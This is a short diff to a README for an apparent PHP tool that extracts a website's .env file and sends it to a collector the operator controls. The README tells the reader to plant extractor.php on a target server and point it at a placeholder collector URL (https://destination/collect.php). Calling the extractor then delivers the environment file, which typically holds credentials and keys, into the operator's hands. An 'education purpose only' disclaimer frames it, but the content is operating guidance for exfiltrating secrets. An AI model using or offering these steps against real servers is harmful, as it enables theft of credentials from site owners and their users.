@@ -5,6 +5,8 @@ This tool is designed for education purpose only to learn testing and security  
 
 #upload extractor.php to  target  location 
 
+#update collector destination in extractor.php ... define('https://destination/collect.php'   )
+
 #collector.php keep it in your own device or anywhere location where you want to fetch env data.
 
 call url of https://...extractor.php  that's it ..env file will be there in your pocket.
